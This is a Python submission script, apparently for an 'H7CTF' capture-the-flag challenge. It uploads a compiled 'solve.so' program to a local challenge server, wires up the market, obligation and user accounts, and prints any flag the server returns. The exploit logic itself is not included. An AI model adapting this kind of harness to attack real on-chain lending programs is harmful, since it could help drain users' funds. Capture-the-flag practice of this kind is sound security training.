#!/usr/bin/env python3
import os, socket, secrets, sys

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "1337"))
SOLVE_SO = os.environ.get("SOLVE_SO", "solve.so")
OPEN_COUNT = int(os.environ.get("COUNT", "20000"))

B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58encode(b):
    n = int.from_bytes(b, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    for c in b:
        if c == 0:
            out = "1" + out
        else:
            break
    return out


def main():
    solve_so = open(SOLVE_SO, "rb").read()
    solve_pubkey = b58encode(secrets.token_bytes(32))

    s = socket.create_connection((HOST, PORT))
    f = s.makefile("rwb")

    f.write((solve_pubkey + "\n").encode())
    f.write((str(len(solve_so)) + "\n").encode())
    f.write(solve_so)
    f.flush()

    program = market = obligation = user = None
    while None in (program, market, obligation, user):
        line = f.readline()
        if not line:
            print("server closed before setup", file=sys.stderr)
            sys.exit(1)
        text = line.decode(errors="replace").strip()
        if text.startswith("program:"):
            program = text.split()[1]
        elif text.startswith("user:"):
            user = text.split()[1]
        elif text.startswith("market:"):
            market = text.split()[1]
        elif text.startswith("obligation:"):
            obligation = text.split()[1]

    f.write(f"4\nr {program}\nr {market}\nw {obligation}\ns {user}\n4\n".encode())
    f.write(OPEN_COUNT.to_bytes(4, "little"))
    f.flush()

    s.shutdown(socket.SHUT_WR)

    for line in f:
        text = line.decode(errors="replace")
        if "positions:" in text or "H7CTF{" in text or "flag" in text.lower() or "no flag" in text:
            print(text.strip())


if __name__ == "__main__":
    main()
